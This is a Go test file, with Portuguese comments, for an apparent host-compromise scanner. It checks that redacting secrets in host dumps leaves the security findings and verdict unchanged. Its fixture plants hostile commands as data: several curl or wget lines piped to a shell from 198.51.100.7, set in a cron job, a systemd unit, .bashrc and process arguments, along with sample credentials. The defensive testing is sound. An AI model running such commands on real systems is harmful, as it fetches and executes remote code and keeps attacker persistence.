package dump

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"sort"
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/check"
	_ "github.com/lex0c/aletheia/internal/checks" // registra o catálogo
	"github.com/lex0c/aletheia/internal/facts"
)

// A REDAÇÃO NÃO PODE MUDAR CONCLUSÃO.
//
// Ela reescreve superfície textual na ESCRITA do artefato: argv, linha de cron,
// valor de variável, comando de unit, gatilho de startup. Os checks leem essas
// MESMAS strings — `path.suspect_dir` olha o exe, `cron.*` olha o comando, o
// caçador de interpretador procura `curl … | sh` dentro da linha.
//
// Então há duas leituras possíveis do mesmo host: `aletheia scan`, que roda os
// checks sobre o Facts CRU, e o servidor MCP em modo live, que roda sobre o
// Facts que passou por dump.De. Se a redação apagar o pedaço que um check
// casava, as duas dão vereditos diferentes sobre a mesma máquina — e a segunda
// dá o veredito mais tranquilizador, que é a pior direção para errar.
//
// A catraca compara identidade, severidade, sujeito e cobertura. O TEXTO da
// evidência pode e deve diferir: é ele que carrega o segredo.
func TestRedacaoNaoMudaOVeredito(t *testing.T) {
	cru := fatosComSegredoEmTodoCampoRedigido()

	// A ida e volta por disco é o caminho REAL: é assim que o artefato nasce, e
	// é dele que o MCP e o analyze leem.
	var buf bytes.Buffer
	if err := De(ambienteDeTeste(), cru).Escrever(&buf); err != nil {
		t.Fatal(err)
	}
	caminho := filepath.Join(t.TempDir(), "host.json")
	if err := os.WriteFile(caminho, buf.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	d, err := Carregar(caminho)
	if err != nil {
		t.Fatal(err)
	}

	e := ambienteDeTeste()
	antes := check.Run(check.All(), cru, e)
	depois := check.Run(check.All(), d.Facts, e)

	if a, b := assinatura(antes), assinatura(depois); a != b {
		t.Errorf("a redação mudou os ACHADOS.\ncru:      %s\nredigido: %s\n\n"+
			"Os dois lados descrevem o mesmo host: um pelo scan, outro por um "+
			"dump. Vereditos diferentes significam que a redação apagou o pedaço "+
			"de texto em que um check se apoiava.", a, b)
	}
	if a, b := cobertura(antes), cobertura(depois); a != b {
		t.Errorf("a redação mudou a COBERTURA.\ncru:      %s\nredigido: %s", a, b)
	}
	if antes.Verdict() != depois.Verdict() {
		t.Errorf("veredito: cru=%s redigido=%s", antes.Verdict(), depois.Verdict())
	}

	// AS DUAS PROVAS DE QUE O TESTE NÃO PASSOU POR VACUIDADE.
	//
	// A primeira versão tinha só a de baixo, e ela não bastava: a fixture
	// produzia ZERO achado — internal/dump não importava internal/checks, então
	// o catálogo estava vazio — e o teste comparava dois conjuntos vazios com
	// ar de aprovação. Uma mutação que apagava toda linha redigida passou
	// limpa. Um teste que não consegue falhar é pior que teste nenhum.
	if len(antes.Findings) == 0 {
		t.Fatal("a fixture não produziu achado nenhum: não há veredito a " +
			"preservar, e a comparação acima passou por vacuidade")
	}
	if bytes.Equal(marshalar(t, cru), marshalar(t, d.Facts)) {
		t.Fatal("o artefato saiu idêntico ao Facts cru: a fixture não tem " +
			"segredo nenhum para redigir, e a comparação acima não provou nada")
	}
}

func assinatura(r *check.Report) string {
	linhas := make([]string, 0, len(r.Findings))
	for _, f := range r.Findings {
		linhas = append(linhas, fmt.Sprintf("%s|%s|%s", f.ID, f.Sev, f.Subject))
	}
	sort.Strings(linhas)
	return strings.Join(linhas, "\n")
}

func cobertura(r *check.Report) string {
	c := r.Coverage
	nc := make([]string, 0, len(c.NotChecked))
	for _, n := range c.NotChecked {
		nc = append(nc, n.ID)
	}
	sort.Strings(nc)
	p := make([]string, 0, len(c.Partial))
	for _, x := range c.Partial {
		p = append(p, x.ID)
	}
	sort.Strings(p)
	return fmt.Sprintf("total=%d completos=%d parciais=%v naoverificados=%v lacunas=%v",
		c.Total, c.Complete, p, nc, c.CollectorGaps)
}

// TODO CAMPO REDIGIDO ESTÁ NA FIXTURE.
//
// A equivalência acima só vale sobre o que a fixture planta. Um campo novo com
// tag `redact` e sem valor aqui deixaria a comparação passar sem nunca ter
// exercido a redação daquele campo — e o silêncio se leria como aprovação.
//
// Não há tabela a manter: o guard anda sobre o VALOR da fixture, e a fixture é
// a própria declaração. Marcou um campo para redigir, plante um segredo nele.
func TestTodoCampoRedigidoEstaNaFixtureDeEquivalencia(t *testing.T) {
	declarados := map[string]bool{}
	visitar(reflect.TypeOf(facts.Facts{}), map[reflect.Type]bool{}, func(dono, campo string) {
		declarados[dono+"."+campo] = true
	})
	if len(declarados) == 0 {
		t.Fatal("nenhum campo com tag redact: o walk quebrou, não a redação")
	}

	plantados := camposPreenchidos(reflect.ValueOf(fatosComSegredoEmTodoCampoRedigido()))

	for nome := range declarados {
		if !plantados[nome] {
			t.Errorf("%s tem tag redact e a fixture de equivalência não planta "+
				"valor nele.\nSem valor, a catraca acima nunca exercita a redação "+
				"deste campo — ela passa por vacuidade.", nome)
		}
	}
}

// camposPreenchidos anda pelo VALOR e devolve os campos com tag redact que
// carregam algo. Percorre struct, ponteiro, slice e map, que é a forma inteira
// do Facts.
func camposPreenchidos(v reflect.Value) map[string]bool {
	achados := map[string]bool{}
	var anda func(reflect.Value)
	anda = func(v reflect.Value) {
		switch v.Kind() {
		case reflect.Ptr, reflect.Interface:
			if !v.IsNil() {
				anda(v.Elem())
			}
		case reflect.Slice, reflect.Array:
			for i := 0; i < v.Len(); i++ {
				anda(v.Index(i))
			}
		case reflect.Map:
			for _, k := range v.MapKeys() {
				anda(v.MapIndex(k))
			}
		case reflect.Struct:
			t := v.Type()
			for i := 0; i < t.NumField(); i++ {
				c := t.Field(i)
				if c.PkgPath != "" {
					continue // não exportado: a redação também não o alcança
				}
				f := v.Field(i)
				if tag := c.Tag.Get("redact"); tag != "" && tag != "-" && !f.IsZero() {
					achados[t.Name()+"."+c.Name] = true
				}
				anda(f)
			}
		}
	}
	anda(v)
	return achados
}

func visitar(t reflect.Type, visto map[reflect.Type]bool, fn func(dono, campo string)) {
	for t.Kind() == reflect.Ptr || t.Kind() == reflect.Slice || t.Kind() == reflect.Array {
		t = t.Elem()
	}
	if t.Kind() == reflect.Map {
		visitar(t.Elem(), visto, fn)
		return
	}
	if t.Kind() != reflect.Struct || visto[t] {
		return
	}
	visto[t] = true
	for i := 0; i < t.NumField(); i++ {
		c := t.Field(i)
		if c.Tag.Get("redact") != "" && c.Tag.Get("redact") != "-" {
			fn(t.Name(), c.Name)
		}
		visitar(c.Type, visto, fn)
	}
}

func marshalar(t *testing.T, f *facts.Facts) []byte {
	t.Helper()
	b, err := json.Marshal(f)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

// A fixture planta um SEGREDO em cada campo com tag redact, e planta junto o
// pedaço que um check casa — os dois no mesmo valor. É essa sobreposição que
// torna a comparação capaz de falhar: se a redação for larga demais, ela come o
// gatilho do check e o achado some do lado redigido.
func fatosComSegredoEmTodoCampoRedigido() *facts.Facts {
	return &facts.Facts{
		SchemaVersion: facts.SchemaVersion,
		CollectedAt:   "2026-08-17T21:03:11Z",
		Source:        "live",
		Host:          facts.Host{Hostname: "web-01", Kernel: "6.1.0", NumCPU: 8},

		// Process.Argv — redact:"cmdline"
		Processes: []facts.Process{
			{PID: 1, PPID: 0, Comm: "systemd", Exe: "/usr/lib/systemd/systemd"},
			{PID: 812, PPID: 1, Comm: "sh", Exe: "/tmp/.cache/sh",
				Argv: []string{"sh", "-c", "curl -H 'Authorization: Bearer eyJhbGciOi' http://198.51.100.7/x | sh"}},
			{PID: 913, PPID: 1, Comm: "mysqldump", Exe: "/usr/bin/mysqldump",
				Argv: []string{"mysqldump", "-u", "root", "-pS3cr3tP4ss", "prod"}},
		},

		// CronJob.Cmd — redact:"linha"; CronJob.Env — redact:"valor"
		Cron: []facts.CronEntry{{
			File: "/etc/cron.d/backup", Kind: "dropin", User: "root",
			Schedule: "* * * * *", IntervalSec: 60,
			Cmd: "/bin/bash -c 'curl -s http://198.51.100.7/p.sh?k=A1b2C3d4E5f6 | bash'",
			Env: []facts.EnvSetting{{
				File: "/etc/cron.d/backup", Key: "AWS_SECRET_ACCESS_KEY",
				Value: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
			}},
		}},

		// TriggerLine.Text — redact:"linha"
		// ExecLine.Cmd — redact:"linha"
		Units: []facts.Unit{{
			Name: "telemetry.service", Path: "/etc/systemd/system/telemetry.service",
			Kind: "service", Scope: "system",
			Exec: []facts.ExecLine{{
				Key: "ExecStart",
				Cmd: "/bin/sh -c 'wget -q -O- http://198.51.100.7/t?token=ghp_A1b2C3d4E5f6G7h8 | sh'",
			}},
		}},

		// HelperDoKernel.Valor — redact:"linha"
		Helpers: []facts.HelperDoKernel{{
			Nome: "core_pattern", Fonte: "/proc/sys/kernel/core_pattern",
			Valor: "|/tmp/.x/collect --key=AKIAIOSFODNN7EXAMPLE %p",
			Alvo:  "/tmp/.x/collect",
		}},

		// SSHClientExec.Command — redact:"linha"
		SSHClientExec: []facts.SSHClientExec{{
			File: "/root/.ssh/config", Line: 7, Directive: "ProxyCommand",
			Command: "ssh -o StrictHostKeyChecking=no -i /root/.ssh/id_ed25519 " +
				"jump@198.51.100.7 -W %h:%p -p 2222",
		}},

		Triggers: []facts.Trigger{{
			File: "/root/.bashrc", Kind: "shell_rc", When: "login", User: "root",
			Lines: []facts.TriggerLine{{
				N: 42, Added: true, Tail: true,
				Text: "curl -s https://user:hunter2@198.51.100.7/i.sh | sh",
			}},
		}},
	}
}
